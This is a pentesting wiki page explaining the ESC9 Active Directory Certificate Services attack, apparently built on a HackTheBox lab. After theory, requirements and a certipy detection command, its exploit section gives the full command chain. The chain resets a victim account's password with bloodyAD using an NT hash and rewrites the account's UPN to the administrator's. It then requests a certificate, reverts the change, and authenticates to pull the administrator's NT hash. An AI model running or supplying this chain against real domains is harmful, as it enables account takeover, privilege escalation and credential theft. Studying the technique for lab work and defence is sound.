---
description: No Security Extension on Certificate Template
---

# ESC9

The difference between ESC16 and ESC9 is important: ESC16 is a misconfiguration at the **Certificate Authority** level, so all certificates issued by that CA can be affected. ESC9 is a vulnerable **certificate template**, so only certificates based on that template are at risk

### Theory

Certificate mapping is the part of certificate authentication where the DC takes the principal (user or computer) data provided in the certificate used during authentication, and attempts to map it to a user or computer in the domain. The key here is modifying the UPN of a controlled account to match the user we want to impersonate. This tricks the DC into mapping the certificate to the impersonated identity during authentication

### Requirements

ESC9 abuse requirements :

* Client authentication ⇒ True
* Enrollment flag ⇒ NoSecurityExtension
* Extended key usage ⇒ Client authentication
* Requires manager approval ⇒ False
* Authorized signatures required ⇒ 0
* Enrollment rights ⇒ Weak enrollment rights like `Domain Users`, `Everyone`, `Authenticated Users`, or `Domain Computers`, or a user / group we have control over
* `StrongCertificateBindingEnforcement = 1` (Compatibility) or `0` (Disabled) on DCs (no output on certipy)

{% hint style="danger" %}
We must have a user A who has write permissions (`GenrericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`) over a user B who falls in the enrollment rights category
{% endhint %}

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsEr9slck8oO7y2A4tRgl%2Fimage.png?alt=media&#x26;token=d32945ee-28ea-43a9-b773-46780c95aac1" alt=""><figcaption></figcaption></figure>

### Detect

```shellscript
# Enumerate all vulnerable templates
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -stdout -enabled -vulnerable
certipy-ad find -u '<USER>@<DOMAIN>' -hashes :<NT_HASH> -dc-ip <DC_IP> -stdout -enabled -vulnerable  
```

### Exploit

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2bRw8KrD6DQmjwEGg9sR%2Fimage.png?alt=media&#x26;token=d9afd919-754e-480b-8e64-d4a38a435082" alt=""><figcaption></figcaption></figure>

```shellscript
# Use the GenericAll permission to change ca_operator's password
bloodyAD --host DC01.certified.htb -d "certified.htb" -u "management_svc" -p :a091c1832bcdd4677c28b5a6a1295584 set password "ca_operator" "Hacked@123"

# Use ca_operator to find vulnerable templates
certipy-ad find -u 'ca_operator@certified.htb' -p 'Hacked@123' -dc-ip 10.10.11.41 -stdout -enabled -vulnerable 

# Change the UPN of the target to match the administrator's one
certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator@certified.htb -dc-ip 10.10.11.41

# Request a certificate as the target user
# Since the UPN now matches that of the administrator, the certificate will be mapped 
# to the administrator account during authentication, allowing us to impersonate them
certipy-ad req -u ca_operator@certified.htb -p 'Hacked@123' -ca certified-DC01-CA -template CertifiedAuthentication -target 10.10.11.41 

# Revert the changes for the target account to avoid authentication issues 
# If the UPN still says administrator@lab.local, the DC might map the cert to ca_operator
# instead of the real administrator 
certipy-ad account update -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41

# Authenticate as administrator and grab the NT hash
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41
```
